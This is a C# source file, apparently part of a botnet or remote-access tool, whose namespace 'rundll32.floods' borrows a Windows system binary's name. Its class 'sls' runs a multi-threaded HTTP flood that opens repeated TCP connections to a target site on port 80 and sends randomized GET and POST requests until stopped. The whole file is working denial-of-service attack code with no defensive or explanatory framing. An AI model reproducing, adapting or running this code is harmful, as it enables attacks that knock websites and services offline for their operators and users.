using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace rundll32.floods;

internal class sls
{
	private static string _url;

	private static int _threads;

	private static int _delay;

	private static Thread[] t_list;

	public static bool flooding = false;

	public static bool start(string url, int threads, int delay)
	{
		if (!flooding)
		{
			_url = url;
			_threads = threads;
			_delay = delay;
			t_list = new Thread[threads];
			flooding = true;
			for (int i = 0; i < threads; i++)
			{
				t_list[i] = new Thread(request);
				t_list[i].Start();
			}
			return true;
		}
		return false;
	}

	public static bool stop()
	{
		if (flooding)
		{
			flooding = false;
			return true;
		}
		return false;
	}

	private static void request()
	{
		while (flooding)
		{
			try
			{
				TcpClient tcpClient = new TcpClient();
				tcpClient.Connect(_url.Replace("http://", "").Replace("/", ""), 80);
				StreamWriter streamWriter = new StreamWriter(tcpClient.GetStream());
				Random random = new Random(new Random().Next(10000));
				string text = "GET";
				if (random.Next(1000) > 500)
				{
					text = "POST";
				}
				streamWriter.WriteLine(text + " /" + random.Next(99999) + " HTTP/1.1\r\n");
				streamWriter.WriteLine("Host: " + _url.Replace("http://", "").Replace("/", "") + "\r\n");
				streamWriter.WriteLine("Connection: close\r\n");
				streamWriter.WriteLine("User-Agent: none\r\n");
			}
			catch
			{
			}
			Thread.Sleep(_delay);
		}
	}
}
